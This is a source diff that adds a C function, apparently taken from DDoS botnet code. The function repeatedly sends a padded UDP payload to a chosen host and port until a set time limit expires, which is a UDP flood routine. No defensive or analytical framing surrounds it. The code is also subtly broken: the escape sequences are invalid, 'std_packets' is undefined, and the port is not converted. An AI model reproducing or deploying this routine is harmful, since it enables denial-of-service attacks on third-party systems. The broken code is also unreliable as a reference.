@@ -1,0 +1,30 @@
+void astd(unsigned char *ip, int port, int secs) 
+{
+        int std_hex;
+        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
+        time_t start = time(NULL);
+        struct sockaddr_in sin;
+        struct hostent *hp;
+        hp = gethostbyname(ip);
+        bzero((char*) &sin,sizeof(sin));
+        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+        sin.sin_family = hp->h_addrtype;
+        sin.sin_port = port;
+        unsigned int a = 0;
+        while(1)
+        {
+                char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
+                if (a >= 50)
+                {
+                        send(std_hex, hexstring, std_packets, 0);
+                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
+                        if (time(NULL) >= start + secs)
+                        {
+                                close(std_hex);
+                                _exit(0);
+                        }
+                        a = 0;
+                }
+                a++;
+        }
+}
